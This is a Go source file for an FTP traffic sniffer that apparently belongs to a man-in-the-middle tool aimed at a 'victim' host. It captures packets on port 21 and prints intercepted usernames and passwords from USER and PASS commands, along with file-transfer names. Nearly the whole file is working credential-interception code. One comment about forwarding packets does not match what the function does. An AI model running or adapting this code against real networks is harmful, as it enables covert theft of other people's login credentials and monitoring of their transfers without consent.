package sniffer

import (
	"time"
	"fmt"
	"log"
	"strings"
	"strconv"
	"errors"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
	"os"
)

var (	
	snaplen int32 = 1024
	promisc bool  = false
	timeout time.Duration = pcap.BlockForever

	/* prettify */
	cyan   = "\033[36m"
	green  = "\033[32m"
	white  = "\033[37m"
	yellow = "\033[33m"
	red    = "\033[31m"
	fn     = "\033[0m"

	color  = []string{fn,cyan,green,white,yellow,red}
)

/* 
 ** Loops through array of available interfaces on host,
 ** then chooses first one that is not loopback (lo0)
 */

func selectInterface() (pcap.Interface, error) {
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		return pcap.Interface{}, err
	}
	for _, iface := range ifaces {
		if iface.Name != "lo0" && iface.Name != "lo" {
			return iface, nil
		}
	}
	return pcap.Interface{}, errors.New("could not find valid network interface")
}

/*
 ** Filters TCP/FTP packets from rest of network,
 ** then prints only packets with Cred./File transfer FTP instructions
 */

func parseCaughtPacket(packet gopacket.Packet) {
	linkLayer := packet.LinkLayer()
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	
	if linkLayer == nil || ipLayer == nil || tcpLayer == nil {
		fmt.Println("[ NULL ] Caught malformed packet")
		return
	}
	
	ip, _ := ipLayer.(*layers.IPv4)
	tcp, _ := tcpLayer.(*layers.TCP)
	appLayer := packet.ApplicationLayer()

	if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) && 
		linkLayer.LinkFlow().Src().String() == os.Args[2] {
		payload := strings.Split(string(appLayer.Payload()), " ")
		cmdID := strings.TrimSuffix(payload[0], "\r\n")
		
		cmdID = strings.TrimSuffix(cmdID, "\n")	
		if ip.SrcIP.String() == os.Args[5] {
			/* Server --> client traffic */
			fmt.Print("[ server sends ] ")
			colID, err := strconv.Atoi(cmdID)
			
			if err != nil {
				colID = 0
			} else {
				colID = colID / 100
			}
			col := color[colID]
			
			fmt.Print(col,"[",cmdID,"]",fn)
			if len(payload) > 1 {
				payloadArgs := strings.TrimSuffix(strings.Join(payload[1:], " "), "\n")
				
				fmt.Print(" with payload: ",payloadArgs)
			}
			fmt.Println()	
		} else {
			/* Client --> server traffic */
			fmt.Print("[ client sends ] ")
			switch payload[0] {
			case "USER":
				fmt.Print(red,"[CRED]",fn," Caught credentials: USERNAME ",payload[1])
			case "PASS":
				fmt.Print(red,"[CRED]",fn," Caught credentials: PASSWORD ",payload[1])
			case "RETR":
				fmt.Print(green,"[FILE TRANSFER]",fn," Client <--- Server: ",payload[1])
			case "STOR":
				fmt.Print(green,"[FILE TRANSFER]",fn," Client ---> Server: ",payload[1])
			default:
				fmt.Print(cyan,"[",cmdID,"]",fn)
				if len(payload) > 1 {
					payloadArgs := strings.TrimSuffix(strings.Join(payload[1:], " "), "\n")
					
					fmt.Print(" with payload: ", payloadArgs)
				}
				fmt.Println()
			}
		}
	}
}

/*
 ** Tunnel packets to initial destination,
 ** not to provoke an unintended DoS on client
 */

func Sniffer(victimIP string) {
	filter := "not ip6 and tcp and host " + os.Args[3]
	iface, err := selectInterface()
	
	if err != nil {
		log.Fatal(err)
	}
	dev := iface.Name
	handle, err := pcap.OpenLive(dev, snaplen, promisc, timeout)
	
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	
	fmt.Printf("📡 [ MONITORING NETWORK FOR IP %s ] 📡\n", os.Args[3])
	for packet := range packetSource.Packets() {
		parseCaughtPacket(packet)
	}
}
